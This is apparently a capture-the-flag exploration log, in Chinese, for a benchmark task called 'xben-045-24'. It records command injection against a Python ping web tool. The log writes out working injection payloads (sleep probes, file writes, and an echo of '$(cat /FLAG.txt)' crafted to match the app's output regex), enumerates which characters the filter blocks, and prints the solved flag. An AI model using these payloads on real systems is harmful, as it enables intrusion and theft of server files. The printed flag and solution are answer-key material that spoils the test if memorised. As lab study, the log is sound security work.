# xben-045-24 · 探索记录

对应题解：[`xben-045-24.md`](./xben-045-24.md)

## 目标与起点

`Werkzeug/3.0.6 Python/3.8.20`，`Ping Tool`，`POST /ping`，字段 `ip_address`。
与 `xben-037-24` 同名同形，但回显不同：

```html
<pre>Packets Transmitted: 2, Packets Received: 2, Packet Loss: 0%</pre>
```

## 第一阶段：确认注入（时间盲注）

| 输入 | 时间 |
| --- | --- |
| `127.0.0.1` | 1.11 s |
| `127.0.0.1;sleep 3` | 4.09 s |
| `$(sleep 3)` | 3.16 s |
| `` `sleep 3` `` | 4.19 s |
| `127.0.0.1\|sleep 3` | 0.08 s（Invalid） |
| `127.0.0.1&&sleep 3` | 0.08 s（Invalid） |

## 第二阶段：想写静态目录（037 的老办法）——失败

```bash
ip_address=127.0.0.1;ls /app/static > /app/static/ls.txt
curl /static/ls.txt   # 404
```

试了 `/app/static`、`/var/www/static`、`/opt/app/static` 等 5 个候选，
`/static/marker.txt` 全部 404 —— 无法确定静态目录的物理路径，这条路放弃。

## 第三阶段：解析失败泄露正则

```bash
ip_address=notexisthostzzz
```

```html
<pre>Failed to parse ping output, expected format:
     '(.*?) packets transmitted, (.*?) received, (.*?)% packet loss'.</pre>
```

**判据**：三个捕获组分别对应页面上的三个数字。只要我的命令输出一行符合该格式，
就能把任意内容放进 `Packets Received`。

## 第四阶段：反射外带

```bash
ip_address=badhostzzz;echo "1 packets transmitted, $(cat /FLAG.txt) received, 0% packet loss"
```

```html
<pre>Packets Transmitted: 1, Packets Received: flag{bff0530a-cfe6-4476-8b4c-783111134806}, Packet Loss: 0%</pre>
```

`badhostzzz` 的作用：让 `ping` 不产生可解析行（它的输出是 stderr），
避免真实 ping 的统计先被正则命中。

## 第五阶段：确认 flag 路径

| 路径 | 结果 |
| --- | --- |
| `/flag.txt` | 空 |
| **`/FLAG.txt`** | **flag{bff0530a-…}** |
| `/flag`、`/tmp/flag`、`/app/flag.txt`、`/root/flag.txt`、`/home/flag.txt` | 空 |

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 写 `/app/static` 等 5 个候选目录 | `/static/marker.txt` 全 404 | 不知道静态目录物理路径 |
| `$(find / -iname "*flag*")` | `Invalid input` | 过滤器拦 `*`/`%` |
| `$(cat /flag.txt 2>/dev/null)` | `Invalid input` | 过滤器拦 `>` |
| `\|` 与 `&&` | `Invalid input` | 分隔符黑名单 |
| `$(ls /)` 直接塞进 echo | 解析失败 | `ls` 多行输出破坏单行正则 |

## 这次真正的收获

1. **报错信息往往就是输出通道。** 这里的「expected format」把正则完整打印出来，
   等于给了我把内容映射到页面的方法；比继续试写文件快一个数量级。
2. **命令输出被解析时，要先让原命令静默。** 用不存在的主机名使 `ping` 无 stdout，
   自己的 echo 就成为唯一匹配项——这是一个可复用的小技巧。
3. **过滤器要枚举，不要假设。** 本题只挡 `|`、`&&`、`>`、`*`、`%`；
   `;`、`$()`、反引号、`cat`、`head`、`wc`、`ls` 都可用。
4. **同一个功能的不同实现，外带方式不同。** 037 输出被丢弃 → 只能写静态目录；
   045 输出被正则解析 → 可以直接反射到页面。
5. **flag 名大小写又是分水岭。** `/FLAG.txt` 存在，`/flag.txt` 不存在。
